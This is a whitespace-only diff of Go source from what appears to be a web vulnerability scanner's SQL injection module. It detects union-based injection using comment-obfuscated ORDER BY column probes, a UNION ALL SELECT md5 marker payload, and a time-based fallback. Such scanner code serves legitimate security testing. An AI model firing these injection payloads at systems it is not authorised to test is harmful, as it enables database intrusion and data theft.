@@ -23,14 +23,14 @@ func (sql *Sqlmap) checkUnionBased(pos int, closeType string) bool {
     if sql.guessColumnNum(pos, closeType) != -1 {
         return true
     }
-
+    
     // 去除这种
     // if sql.bruteColumnNum(pos, closeType) != -1 {
     //    return true
     // }
-
+    
     return false
-
+    
 }
 
 // 猜列数, 有回显
@@ -39,7 +39,7 @@ func (sql *Sqlmap) guessColumnNum(pos int, closeType string) int {
     // OrderByMax := 100
     // lowCols, highCols := 1, OrderByStep
     // found := false
-
+    
     var (
         payload      string
         columnNum    int
@@ -48,7 +48,7 @@ func (sql *Sqlmap) guessColumnNum(pos int, closeType string) int {
         defaultRatio float64 = -1
         resp         *httpx.Response
     )
-
+    
     condition_1, defaultRatio, resp = sql.orderByTest(1, pos, closeType, defaultRatio)
     condition_2, defaultRatio, _ = sql.orderByTest(util.RandomNumber(9999, 999999), pos, closeType, defaultRatio)
     if condition_1 && !condition_2 {
@@ -142,19 +142,19 @@ func (sql *Sqlmap) bruteColumnNum(pos int, closeType string) int {
     /* UPPER_COUNT - LOWER_COUNT *MUST* >= 5 */
     LowerCount := 1
     UpperCount := 15
-
+    
     err, standardRespTime := getNormalRespondTime(sql)
-
+    
     if err != nil {
         // 因获取响应时间出错 不再继续测试时间盲注
         logging.Logger.Debugln("尝试检测 TimBased-Blind响应时间失败")
         return -1
     }
-
+    
     randStr := `"` + util.RandomLetters(5) + `"` + ","
-
+    
     ratios := make(map[int]float64)
-
+    
     for index, param := range sql.Variations.Params {
         if index == pos {
             for i := LowerCount; i <= UpperCount; i++ {
@@ -169,19 +169,19 @@ func (sql *Sqlmap) bruteColumnNum(pos int, closeType string) int {
                 } else {
                     res, err = sql.Client.Request(sql.Url, sql.Method, payload, sql.Headers)
                 }
-
+                
                 if err != nil {
                     logging.Logger.Debugln(sql.Url, "尝试检测 Union SQL Injection Payload 失败")
                     continue
                 }
-
+                
                 ratios[i-1] = strsim.Compare(res.Body, sql.TemplateBody)
                 time.Sleep(time.Millisecond * 500) // 避免过于频繁请求导致速率被限制进而导致结果偏差
                 continue
             }
         }
     }
-
+    
     var (
         lowest                = 1.0
         highest               = 0.0
@@ -189,7 +189,7 @@ func (sql *Sqlmap) bruteColumnNum(pos int, closeType string) int {
         highest_count         = 0
         distinguish   float64 = -1
     )
-
+    
     for _, value := range ratios {
         if value > highest {
             highest = value
@@ -198,24 +198,24 @@ func (sql *Sqlmap) bruteColumnNum(pos int, closeType string) int {
             lowest = value
         }
     }
-
+    
     var middle []float64
-
+    
     for _, value := range ratios {
         if value != highest && value != lowest {
             middle = append(middle, value)
             continue
         }
-
+        
         if value == lowest {
             lowest_count = lowest_count + 1
         }
-
+        
         if value == highest {
             highest_count = highest_count + 1
         }
     }
-
+    
     if len(middle) == 0 && highest != lowest {
         if highest_count == 1 {
             distinguish = highest
@@ -223,7 +223,7 @@ func (sql *Sqlmap) bruteColumnNum(pos int, closeType string) int {
             distinguish = lowest
         }
     }
-
+    
     if distinguish != -1 {
         var columnNum = 0
         for index, value := range ratios {
@@ -231,12 +231,12 @@ func (sql *Sqlmap) bruteColumnNum(pos int, closeType string) int {
                 columnNum = index + 1
             }
         }
-
+        
         md5Randstr := util.RandomLetters(5)
         for index, param := range sql.Variations.Params {
             if index == pos {
                 payload = param.Value + closeType + `/**/UniOn/**/All/**/Select/**/` + strings.Repeat(fmt.Sprintf(`md5('%v'),`, md5Randstr), columnNum)
-
+                
                 payload = sql.Variations.SetPayloadByIndex(param.Index, sql.Url, strings.TrimRight(payload, ",")+"#", sql.Method)
                 if payload == "" {
                     continue
@@ -250,7 +250,7 @@ func (sql *Sqlmap) bruteColumnNum(pos int, closeType string) int {
                 if err != nil {
                     continue
                 }
-
+                
                 md5CheckVal := util.MD5(md5Randstr)
                 if funk.Contains(res.ResponseDump, md5CheckVal) {
                     JieOutput.OutChannel <- JieOutput.VulMessage{
@@ -268,14 +268,14 @@ func (sql *Sqlmap) bruteColumnNum(pos int, closeType string) int {
                         },
                         Level: JieOutput.Critical,
                     }
-
+                    
                     logging.Logger.Debugln("UNION 列数经过ORDER BY 探测为 ", columnNum)
                     return columnNum
                 }
             }
         }
     }
-
+    
     for index, param := range sql.Variations.Params {
         if index == pos {
             for i := LowerCount; i <= UpperCount; i++ {
@@ -290,11 +290,11 @@ func (sql *Sqlmap) bruteColumnNum(pos int, closeType string) int {
                 } else {
                     res, err = sql.Client.Request(sql.Url, sql.Method, payload, sql.Headers)
                 }
-
+                
                 if err != nil {
                     continue
                 }
-
+                
                 if res.ServerDurationMs > standardRespTime*2+1000 {
                     JieOutput.OutChannel <- JieOutput.VulMessage{
                         DataType: "web_vul",
@@ -320,13 +320,13 @@ func (sql *Sqlmap) bruteColumnNum(pos int, closeType string) int {
             }
         }
     }
-
+    
     return -1
 }
 
 func (sql *Sqlmap) orderByTest(number, pos int, closeType string, defaultRatio float64) (bool, float64, *httpx.Response) {
     var payload string
-
+    
     for index, param := range sql.Variations.Params {
         if index == pos {
             payload = param.Value + closeType + `/**/ORDeR/**/bY/**/` + strconv.Itoa(number) + "#"
@@ -341,22 +341,22 @@ func (sql *Sqlmap) orderByTest(number, pos int, closeType string, defaultRatio f
             } else {
                 res, err = sql.Client.Request(sql.Url, sql.Method, payload, sql.Headers)
             }
-
+            
             if err != nil {
                 continue
             }
-
+            
             // 每种检测方式都加上这个报错检测
             sql.DBMS = checkDBMSError(sql.Url, param.Name, payload, res)
             if sql.DBMS != "" {
                 return false, 0, nil
             }
-
+            
             condition, dr := sql.comparison(res.Body, res.StatusCode, defaultRatio)
-
+            
             math1, _ := util.MatchAnyOfRegexp([]string{"(warning|error):", "order (by|clause)", "unknown column", "failed"}, res.Body)
             math2, _ := util.MatchAnyOfRegexp([]string{"data types cannot be compared or sorted"}, res.Body)
-
+            
             return !math1 && condition || math2, dr, res
         }
     }
